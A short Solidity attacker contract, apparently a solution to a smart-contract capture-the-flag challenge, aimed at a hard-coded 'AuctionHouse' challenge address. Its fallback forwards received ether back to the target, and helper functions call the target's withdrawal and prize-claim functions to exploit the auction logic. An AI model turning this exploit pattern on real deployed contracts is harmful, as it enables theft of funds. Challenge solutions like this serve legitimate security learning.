// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.0;

import "./AuctionHouse.sol";


contract Contract{
        address payable public YOUR_CHALLENGE_CONTRACT_ADDRESS = payable(address(0x9CD3Fc15a9A963274Fe569b9bdaFcC9E1c0678eA));
	AuctionHouse public creature = AuctionHouse(YOUR_CHALLENGE_CONTRACT_ADDRESS);

	receive() external payable {
	//function attack2(uint256 amount) payable external {
		//creature.transfer(value);
		YOUR_CHALLENGE_CONTRACT_ADDRESS.call{value: msg.value}("");
        }


	function withdraw() external {
		creature.withdrawFromAuction();
	}

	function claim() external {
                creature.claimPrize();
        }


}

